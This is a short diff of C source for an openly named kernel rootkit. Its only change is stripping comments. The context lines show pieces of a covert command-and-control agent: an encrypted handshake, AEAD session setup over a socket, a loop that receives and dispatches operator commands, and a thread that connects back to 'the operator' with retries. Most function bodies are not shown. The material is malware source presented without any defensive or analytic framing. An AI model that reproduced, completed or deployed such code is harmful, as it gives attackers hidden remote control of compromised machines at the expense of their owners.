@@ -12,13 +12,11 @@
 
 #include "rootkit.h"
 
-// Exchange encrypted HELLO to confirm both sides share the key.
 static int rk_handshake(struct rk_session *s)
 {
 	return rk_send_sealed(s, (const u8 *)"HELLO 1", 7);
 }
 
-// Initialize AEAD transform and session state.
 static int rk_session_init(struct rk_session *sess, struct socket *sock)
 {
 	int error;
@@ -46,7 +44,6 @@ free_tfm:
 	return error;
 }
 
-// Receive commands, dispatch, loop.
 static void rk_handle_session(struct rk_session *s)
 {
 	u8 *cmd;
@@ -70,7 +67,6 @@ static void rk_handle_session(struct rk_session *s)
 	kfree(cmd);
 }
 
-// Connect to the operator and run an encrypted session.
 int rk_agent_thread(void *data)
 {
 	unsigned int delay_ms = retry_base_ms;
